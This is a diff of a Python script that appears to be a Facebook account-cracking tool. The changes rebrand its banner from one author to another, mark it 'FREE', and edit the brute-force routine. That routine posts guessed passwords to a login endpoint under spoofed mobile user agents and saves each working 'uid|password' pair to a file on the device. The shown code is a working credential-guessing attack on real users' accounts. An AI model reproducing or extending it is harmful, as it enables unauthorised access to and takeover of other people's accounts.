@@ -1,6 +1,5 @@
 from os import path
 import os,base64,zlib,pip,urllib
-####os.system('xdg-open https://facebook.com/groups/351076900316263/')
 print('\n\033[1;37m install modules...\n It will take some seconds...')
 
 try:
@@ -43,16 +42,16 @@ for agent in range(10000):
         l='Mobile Safari/533.1'
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
-logo=("""\033[38;5;92m           ███    ██ ██ ██      ██      
-\033[38;5;91m           ████   ██ ██ ██      ██      
-\033[38;5;90m           ██ ██  ██ ██ ██      ██      
-\033[38;5;89m           ██  ██ ██ ██ ██      ██      
-\033[38;5;88m           ██   ████ ██ ███████ ███████ 
+logo=("""\033[38;5;92m           ███    ██ ██   ██ ████████ 
+\033[38;5;91m           ████   ██  ██ ██     ██    
+\033[38;5;90m           ██ ██  ██   ███      ██    
+\033[38;5;89m           ██  ██ ██  ██ ██     ██    
+\033[38;5;88m           ██   ████ ██   ██    ██    
 \033[38;5;237m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\033[38;5;243m [\033[1;31m+\033[38;5;243m] \033[1;32mAUTHOR    \033[1;31m• \033[38;5;252mNXD-CYBER
-\033[38;5;242m [\033[1;31m+\033[38;5;242m] \033[1;32mVERSION   \033[1;31m• \033[38;5;251m0.0.1
+\033[38;5;243m [\033[1;31m+\033[38;5;243m] \033[1;32mAUTHOR    \033[1;31m• \033[38;5;252mTOPU-NILL
+\033[38;5;242m [\033[1;31m+\033[38;5;242m] \033[1;32mVERSION   \033[1;31m• \033[38;5;251m0.0.2
 \033[38;5;241m [\033[1;31m+\033[38;5;241m] \033[1;32mOWNER     \033[1;31m•\033[38;5;50m NILL x TOPU
-\033[38;5;240m [\033[1;31m+\033[38;5;240m] \033[1;32mSTATUS    \033[1;31m• \033[38;5;249mPERSONAL
+\033[38;5;240m [\033[1;31m+\033[38;5;240m] \033[1;32mSTATUS    \033[1;31m• \033[38;5;249mFREE
 \033[38;5;236m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \033[1;37m""")
 def linex():
         print('\033[38;5;236m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \033[1;37m')
@@ -430,9 +429,9 @@ def rndm(ids,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [NXT-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/NXT-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        oks.append(ids)
+                                        print('\r\r\033[1;32m [NXT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/NXT-RND-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        oks.append(str(uid))
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
